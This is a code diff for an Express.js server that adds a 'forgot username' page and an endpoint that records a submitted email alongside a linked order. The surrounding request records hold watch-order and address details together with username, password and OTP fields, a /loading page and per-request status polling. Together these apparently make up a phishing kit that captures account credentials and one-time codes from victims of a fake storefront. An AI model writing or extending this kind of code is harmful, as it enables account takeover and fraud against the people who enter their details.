@@ -61,7 +61,12 @@ app.get('/forgot', (req, res) => {
 
 app.get('/forgot-username', (req, res) => {
     const lang = getLang(req);
-    res.render('forgot-username', { lang, t: translations[lang], orderId: req.query.orderId });
+    res.render('forgot-username', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
+});
+
+app.get('/forgot-username-success', (req, res) => {
+    const lang = getLang(req);
+    res.render('forgot-username-success', { lang, t: translations[lang] });
 });
 
 app.get('/loading', (req, res) => {
@@ -128,6 +133,32 @@ app.post('/api/submit-otp', (req, res) => {
         request.otp = otp || '';
     }
     res.json({ ok: true });
+});
+
+app.post('/api/submit-forgot-username', (req, res) => {
+    const { email, orderId } = req.body;
+    const request = {
+        id: nextId++,
+        type: 'forgot-username',
+        forgotEmail: email || '',
+        linkedOrderId: orderId ? Number(orderId) : null,
+        name: '',
+        phone: '',
+        email: email || '',
+        delivery: '',
+        branch: '',
+        governorate: '',
+        city: '',
+        address: '',
+        watchColor: '',
+        username: '',
+        password: '',
+        otp: '',
+        status: 'pending',
+        createdAt: new Date().toISOString()
+    };
+    requests.push(request);
+    res.json({ ok: true, id: request.id });
 });
 
 app.get('/api/requests/:id/check', (req, res) => {
